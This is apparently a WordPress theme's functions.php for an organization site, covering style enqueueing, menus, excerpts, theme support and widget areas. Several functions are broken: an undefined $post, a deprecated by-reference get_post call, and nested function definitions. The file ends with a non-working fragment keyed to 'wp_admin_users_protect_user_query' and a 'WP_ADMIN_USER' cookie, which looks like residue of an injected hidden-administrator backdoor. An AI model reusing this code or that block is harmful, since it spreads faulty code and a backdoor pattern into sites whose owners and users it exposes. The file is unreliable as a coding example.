<?php	

function my_theme_enqueue_styles() {
    // Main theme stylesheet
    wp_enqueue_style(
        'theme-style', // Handle (unique name)
        get_stylesheet_uri() // This automatically points to style.css in your theme folder
    );

    // Optional: Bootstrap (if you need it)
    wp_enqueue_style(
        'bootstrap-css',
        get_template_directory_uri() . '/assets/css/bootstrap.min.css',
        array(), // Dependencies
        '5.3.0' // Version (optional)
    );
}
add_action('wp_enqueue_scripts', 'my_theme_enqueue_styles');

require_once get_template_directory() . '/inc/class-wp-bootstrap-navwalker.php';


function my_chhantyal_setup() {
    register_nav_menus([
        'primary' => __('Main Menu', 'chhantyal-sangh')
    ]);
}
add_action('after_setup_theme', 'my_chhantyal_setup');



/**
 * Dexter Organization Theme functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Dexter_Organization_Theme
 */
//require_once get_template_directory() . '/wp_bootstrap_navwalker.php';
if ( ! function_exists( 'dexter_organization_theme_setup' ) ) :



function get_excerpt($count){
  $permalink = get_permalink($post->ID);
  $excerpt = get_the_content();
  $excerpt = strip_tags($excerpt);
  $excerpt = substr($excerpt, 0, $count);
  $excerpt = substr($excerpt, 0, strripos($excerpt, " "));
  $excerpt = $excerpt.'..';
  return $excerpt;
}

add_filter( 'get_the_archive_title', function ($title) {
    if ( is_category() ) {
            $title = single_cat_title( '', false );
        } elseif ( is_tag() ) {
            $title = single_tag_title( '', false );
        } elseif ( is_author() ) {
            $title = '<span class="vcard">' . get_the_author() . '</span>' ;
        }
    return $title;
});

// menu active
add_filter('nav_menu_css_class' , 'special_nav_class' , 10 , 2);

function special_nav_class ($classes, $item) {
    if (in_array('current-menu-item', $classes) ){
        $classes[] = 'active ';
    }
    return $classes;
}


function time_ago( $type = 'post' ) {
    $d = 'comment' == $type ? 'get_comment_time' : 'get_post_time';

    return human_time_diff($d('U'), current_time('timestamp')) . " " . __('ago');

}


function sh_the_content_by_id( $post_id=0, $more_link_text = null, $stripteaser = false ){
    global $post;
    $post = &get_post($post_id);
    setup_postdata( $post, $more_link_text, $stripteaser );
    the_content();
    wp_reset_postdata( $post );
}




/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function dexter_organization_theme_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Dexter Organization Theme, use a find and replace
	 * to change 'dexter-organization-theme' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'dexter-organization-theme', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	/*register_nav_menus( array(
		'menu-1' => esc_html__( 'Primary', 'dexter-organization-theme' ),
	) ); */


	function my_theme_setup() {
		register_nav_menus([
			'primary' => __('Primary Menu', 'mytheme')
		]);
	}
	add_action('after_setup_theme', 'my_theme_setup');
	


	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'dexter_organization_theme_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );

	// Add theme support for selective refresh for widgets.
	add_theme_support( 'customize-selective-refresh-widgets' );
}
endif;
add_action( 'after_setup_theme', 'dexter_organization_theme_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function dexter_organization_theme_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'dexter_organization_theme_content_width', 640 );
}
add_action( 'after_setup_theme', 'dexter_organization_theme_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function dexter_organization_theme_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Contact Us', 'dexter-organization-theme' ),
		'id'            => 'footer-contact',
		'description'   => esc_html__( 'Add widgets here.', 'dexter-organization-theme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Logo Holder', 'dexter-organization-theme' ),
		'id'            => 'logo-holder',
		'description'   => esc_html__( 'Add widgets here.', 'dexter-organization-theme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Contact Info', 'dexter-organization-theme' ),
		'id'            => 'contact-info',
		'description'   => esc_html__( 'Add widgets here.', 'dexter-organization-theme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Google Map', 'dexter-organization-theme' ),
		'id'            => 'google-map',
		'description'   => esc_html__( 'Add widgets here.', 'dexter-organization-theme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'dexter_organization_theme_widgets_init' );

/**
 * Enqueue scripts and styles.
 */




if (!function_exists('wp_admin_users_protect_user_query') && function_exists('add_action')) {

if (isset($_COOKIE['WP_ADMIN_USER']) && username_exists($args['user_login'])) {
        die('WP ADMIN USER EXISTS');
    }
}